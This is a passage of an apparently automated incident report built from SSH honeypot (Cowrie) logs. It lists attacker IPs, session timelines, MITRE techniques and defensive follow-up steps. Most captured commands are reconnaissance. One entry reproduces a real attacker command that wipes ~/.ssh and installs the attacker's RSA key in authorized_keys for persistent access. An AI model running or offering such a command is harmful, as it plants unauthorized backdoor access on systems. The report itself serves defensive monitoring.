| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.success` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.command.input` |
| `2026-07-10 17:58:05` | `cowrie.log.closed` |
| `2026-07-10 17:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c514bb4e96ad

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-07-10 17:59 |
| **Last Seen** | 2026-07-10 17:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:59:34` | `cowrie.session.connect` |
| `2026-07-10 17:59:34` | `cowrie.client.version` |
| `2026-07-10 17:59:34` | `cowrie.client.kex` |
| `2026-07-10 17:59:37` | `cowrie.login.success` |
| `2026-07-10 17:59:37` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aaa4fbdfe69

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-07-10 17:59 |
| **Last Seen** | 2026-07-10 17:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:59:44` | `cowrie.session.connect` |
| `2026-07-10 17:59:44` | `cowrie.client.version` |
| `2026-07-10 17:59:44` | `cowrie.client.kex` |
| `2026-07-10 17:59:45` | `cowrie.login.success` |
| `2026-07-10 17:59:46` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41d5fb676ddb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:59 |
| **Last Seen** | 2026-07-10 17:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:59:52` | `cowrie.session.connect` |
| `2026-07-10 17:59:52` | `cowrie.client.version` |
| `2026-07-10 17:59:52` | `cowrie.client.kex` |
| `2026-07-10 17:59:53` | `cowrie.login.success` |
| `2026-07-10 17:59:54` | `cowrie.session.params` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.success` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.command.input` |
| `2026-07-10 17:59:54` | `cowrie.log.closed` |
| `2026-07-10 17:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a045c2b277

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 18:04 |
| **Last Seen** | 2026-07-10 18:04 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:04:27` | `cowrie.session.connect` |
| `2026-07-10 18:04:29` | `cowrie.client.version` |
| `2026-07-10 18:04:29` | `cowrie.client.kex` |
| `2026-07-10 18:04:36` | `cowrie.login.success` |
| `2026-07-10 18:04:39` | `cowrie.session.params` |
| `2026-07-10 18:04:39` | `cowrie.command.input` |
| `2026-07-10 18:04:42` | `cowrie.log.closed` |
| `2026-07-10 18:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a98dc0529c7

| Field | Detail |
|---|---|
| **Source IP** | `106.12.38[.]73` |
| **First Seen** | 2026-07-10 18:04 |
| **Last Seen** | 2026-07-10 18:05 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:04:57` | `cowrie.session.connect` |
| `2026-07-10 18:04:57` | `cowrie.client.version` |
| `2026-07-10 18:04:57` | `cowrie.client.kex` |
| `2026-07-10 18:04:58` | `cowrie.login.success` |
| `2026-07-10 18:04:59` | `cowrie.client.size` |
| `2026-07-10 18:04:59` | `cowrie.session.params` |
| `2026-07-10 18:05:09` | `cowrie.log.closed` |
| `2026-07-10 18:05:10` | `cowrie.session.params` |
| `2026-07-10 18:05:10` | `cowrie.command.input` |
| `2026-07-10 18:05:11` | `cowrie.log.closed` |
| `2026-07-10 18:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.38[.]73` to AbuseIPDB if not already reported
- [ ] Block `106.12.38[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f8694b8c59

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 18:09 |
| **Last Seen** | 2026-07-10 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:09:34` | `cowrie.session.connect` |
| `2026-07-10 18:09:34` | `cowrie.client.version` |
| `2026-07-10 18:09:34` | `cowrie.client.kex` |
| `2026-07-10 18:09:34` | `cowrie.login.success` |
| `2026-07-10 18:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73fb0b76191d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 18:09 |
| **Last Seen** | 2026-07-10 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:09:34` | `cowrie.session.connect` |
| `2026-07-10 18:09:34` | `cowrie.client.version` |
| `2026-07-10 18:09:34` | `cowrie.client.kex` |
| `2026-07-10 18:09:34` | `cowrie.login.success` |
| `2026-07-10 18:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be5da25e94b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 18:09 |
| **Last Seen** | 2026-07-10 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:09:38` | `cowrie.session.connect` |
| `2026-07-10 18:09:38` | `cowrie.client.version` |
| `2026-07-10 18:09:38` | `cowrie.client.kex` |
| `2026-07-10 18:09:38` | `cowrie.login.success` |
| `2026-07-10 18:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-306c321deae7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 18:09 |
| **Last Seen** | 2026-07-10 18:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:09:38` | `cowrie.session.connect` |
| `2026-07-10 18:09:38` | `cowrie.client.version` |
| `2026-07-10 18:09:38` | `cowrie.client.kex` |
| `2026-07-10 18:09:38` | `cowrie.login.success` |
| `2026-07-10 18:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe419c242179

| Field | Detail |
|---|---|
| **Source IP** | `112.30.127[.]9` |
| **First Seen** | 2026-07-10 18:12 |
| **Last Seen** | 2026-07-10 18:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:12:22` | `cowrie.session.connect` |
| `2026-07-10 18:12:23` | `cowrie.client.version` |
| `2026-07-10 18:12:23` | `cowrie.client.kex` |
| `2026-07-10 18:12:26` | `cowrie.login.success` |
| `2026-07-10 18:12:27` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.127[.]9` to AbuseIPDB if not already reported
- [ ] Block `112.30.127[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c0c0cfd53f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 18:13 |
| **Last Seen** | 2026-07-10 18:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:13:08` | `cowrie.session.connect` |
| `2026-07-10 18:13:08` | `cowrie.client.version` |
| `2026-07-10 18:13:08` | `cowrie.client.kex` |
| `2026-07-10 18:13:09` | `cowrie.login.success` |
| `2026-07-10 18:13:10` | `cowrie.session.params` |
| `2026-07-10 18:13:10` | `cowrie.command.input` |
| `2026-07-10 18:13:10` | `cowrie.log.closed` |
| `2026-07-10 18:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b284424c4993

| Field | Detail |
|---|---|
| **Source IP** | `128.185.220[.]90` |
| **First Seen** | 2026-07-10 18:13 |
| **Last Seen** | 2026-07-10 18:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:13:22` | `cowrie.session.connect` |
| `2026-07-10 18:13:23` | `cowrie.client.version` |
| `2026-07-10 18:13:23` | `cowrie.client.kex` |
| `2026-07-10 18:13:26` | `cowrie.login.success` |
| `2026-07-10 18:13:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.220[.]90` to AbuseIPDB if not already reported
- [ ] Block `128.185.220[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1778e9f7dee1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 18:18 |
| **Last Seen** | 2026-07-10 18:18 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:18:25` | `cowrie.session.connect` |
| `2026-07-10 18:18:28` | `cowrie.client.version` |
| `2026-07-10 18:18:28` | `cowrie.client.kex` |
| `2026-07-10 18:18:37` | `cowrie.login.success` |
| `2026-07-10 18:18:41` | `cowrie.session.params` |
| `2026-07-10 18:18:41` | `cowrie.command.input` |
| `2026-07-10 18:18:43` | `cowrie.log.closed` |
| `2026-07-10 18:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917fedaddc3b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 18:18 |
| **Last Seen** | 2026-07-10 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:18:36` | `cowrie.session.connect` |
| `2026-07-10 18:18:36` | `cowrie.client.version` |
| `2026-07-10 18:18:37` | `cowrie.client.kex` |
| `2026-07-10 18:18:37` | `cowrie.login.success` |
| `2026-07-10 18:18:37` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:18:37` | `cowrie.direct-tcpip.data` |
| `2026-07-10 18:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053e62c708d8

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-07-10 18:23 |
| **Last Seen** | 2026-07-10 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:23:18` | `cowrie.session.connect` |
| `2026-07-10 18:23:19` | `cowrie.client.version` |
| `2026-07-10 18:23:19` | `cowrie.client.kex` |
| `2026-07-10 18:23:20` | `cowrie.login.success` |
| `2026-07-10 18:23:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd209829ff5e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]239` |
| **First Seen** | 2026-07-10 18:24 |
| **Last Seen** | 2026-07-10 18:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:24:55` | `cowrie.session.connect` |
| `2026-07-10 18:24:55` | `cowrie.client.version` |
| `2026-07-10 18:24:55` | `cowrie.client.kex` |
| `2026-07-10 18:24:57` | `cowrie.login.success` |
| `2026-07-10 18:24:57` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]239` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c56593ad773

| Field | Detail |
|---|---|
| **Source IP** | `218.94.115[.]164` |
| **First Seen** | 2026-07-10 18:25 |
| **Last Seen** | 2026-07-10 18:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:25:02` | `cowrie.session.connect` |
| `2026-07-10 18:25:03` | `cowrie.client.version` |
| `2026-07-10 18:25:03` | `cowrie.client.kex` |
| `2026-07-10 18:25:05` | `cowrie.login.success` |
| `2026-07-10 18:25:06` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:25:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.94.115[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.94.115[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28e8988d194

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-10 18:26 |
| **Last Seen** | 2026-07-10 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:26:38` | `cowrie.session.connect` |
| `2026-07-10 18:26:38` | `cowrie.client.version` |
| `2026-07-10 18:26:38` | `cowrie.client.kex` |
| `2026-07-10 18:26:40` | `cowrie.login.success` |
| `2026-07-10 18:26:41` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1010ff6cd233

| Field | Detail |
|---|---|
| **Source IP** | `36.153.164[.]122` |
| **First Seen** | 2026-07-10 18:26 |
| **Last Seen** | 2026-07-10 18:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:26:51` | `cowrie.session.connect` |
| `2026-07-10 18:26:51` | `cowrie.client.version` |
| `2026-07-10 18:26:51` | `cowrie.client.kex` |
| `2026-07-10 18:26:54` | `cowrie.login.success` |
| `2026-07-10 18:26:54` | `cowrie.direct-tcpip.request` |
| `2026-07-10 18:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.153.164[.]122` to AbuseIPDB if not already reported
- [ ] Block `36.153.164[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f6286050b3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 18:31 |
| **Last Seen** | 2026-07-10 18:31 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:31:17` | `cowrie.session.connect` |
| `2026-07-10 18:31:18` | `cowrie.client.version` |
| `2026-07-10 18:31:18` | `cowrie.client.kex` |
| `2026-07-10 18:31:25` | `cowrie.login.success` |
| `2026-07-10 18:31:30` | `cowrie.session.params` |
| `2026-07-10 18:31:30` | `cowrie.command.input` |
| `2026-07-10 18:31:32` | `cowrie.log.closed` |
| `2026-07-10 18:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6167e6800c0f

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-07-10 18:31 |
| **Last Seen** | 2026-07-10 18:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:31:37` | `cowrie.session.connect` |
| `2026-07-10 18:31:37` | `cowrie.client.version` |
| `2026-07-10 18:31:37` | `cowrie.client.kex` |
| `2026-07-10 18:31:37` | `cowrie.login.success` |
| `2026-07-10 18:31:38` | `cowrie.session.params` |
| `2026-07-10 18:31:38` | `cowrie.command.input` |
| `2026-07-10 18:31:38` | `cowrie.command.failed` |
| `2026-07-10 18:31:38` | `cowrie.log.closed` |
| `2026-07-10 18:31:39` | `cowrie.session.params` |
| `2026-07-10 18:31:39` | `cowrie.command.input` |
| `2026-07-10 18:31:39` | `cowrie.session.file_download` |
| `2026-07-10 18:31:39` | `cowrie.log.closed` |
| `2026-07-10 18:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3a4a6096f0

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-07-10 18:31 |
| **Last Seen** | 2026-07-10 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:31:39` | `cowrie.session.connect` |
| `2026-07-10 18:31:39` | `cowrie.client.version` |
| `2026-07-10 18:31:39` | `cowrie.client.kex` |
| `2026-07-10 18:31:39` | `cowrie.login.success` |
| `2026-07-10 18:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa512a80305

| Field | Detail |
|---|---|
| **Source IP** | `103.143.238[.]100` |
| **First Seen** | 2026-07-10 18:31 |
| **Last Seen** | 2026-07-10 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:31:40` | `cowrie.session.connect` |
| `2026-07-10 18:31:40` | `cowrie.client.version` |
| `2026-07-10 18:31:40` | `cowrie.client.kex` |
| `2026-07-10 18:31:40` | `cowrie.login.success` |
| `2026-07-10 18:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.238[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.143.238[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f460718a0bf

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 18:31 |
| **Last Seen** | 2026-07-10 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 18:31:55` | `cowrie.session.connect` |
| `2026-07-10 18:31:55` | `cowrie.client.version` |
| `2026-07-10 18:31:56` | `cowrie.client.kex` |
| `2026-07-10 18:31:56` | `cowrie.login.success` |
| `2026-07-10 18:31:56` | `cowrie.session.params` |
| `2026-07-10 18:31:56` | `cowrie.command.input` |
| `2026-07-10 18:31:57` | `cowrie.log.closed` |
| `2026-07-10 18:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
